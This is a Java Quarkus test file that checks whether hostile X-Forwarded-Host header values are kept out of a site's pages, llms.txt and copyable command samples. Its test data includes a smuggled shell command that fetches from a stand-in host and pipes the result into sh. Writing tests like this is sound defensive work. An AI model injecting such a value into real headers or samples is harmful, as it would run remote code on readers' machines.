package com.eldermoraes.seo;

import io.quarkus.test.junit.QuarkusTest;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;

import static io.restassured.RestAssured.given;
import static org.hamcrest.CoreMatchers.containsString;
import static org.hamcrest.CoreMatchers.not;

/**
 * Defence in depth (2.12.0): in production Caddy overwrites X-Forwarded-Host,
 * but the host also goes into samples a reader copies and runs (curl, fetch,
 * claude mcp add). A header that is not a host name or address, with an
 * optional port, never reaches the HTML, llms.txt or the samples.
 */
@QuarkusTest
class HostileForwardedHostTest {

    @ParameterizedTest(name = "{0} with X-Forwarded-Host [{1}]")
    @CsvSource(delimiter = '|', quoteCharacter = '`', value = {
            "/docs/mcp | `x;curl zqhostile.example|sh`",
            "/docs/mcp | `zqhostile example`",
            "/docs/mcp | `zqhostile\"example`",
            "/llms.txt | `x;curl zqhostile.example|sh`",
            "/llms.txt | `zqhostile'example`",
            "/resource/films/1 | `x;curl zqhostile.example|sh`",
            "/resource/films/1 | `zqhostile example`",
            "/resource/films/1 | `zqhostile'example`",
            "/resource/people/1 | `zqhostile\"example`",
            "/ | `x;curl zqhostile.example|sh`",
    })
    void neverReachesThePage(String path, String hostile) {
        given()
                .header("X-Forwarded-Host", hostile)
                .when().get(path)
                .then().statusCode(200)
                .body(not(containsString("zqhostile")));
    }

    @ParameterizedTest(name = "{0}")
    @CsvSource({"/docs/mcp", "/resource/films/1"})
    void aPlainForwardedHostStillDecides(String path) {
        given()
                .header("X-Forwarded-Host", "preview.example")
                .when().get(path)
                .then().statusCode(200)
                .body(containsString("http://preview.example/"));
    }
}
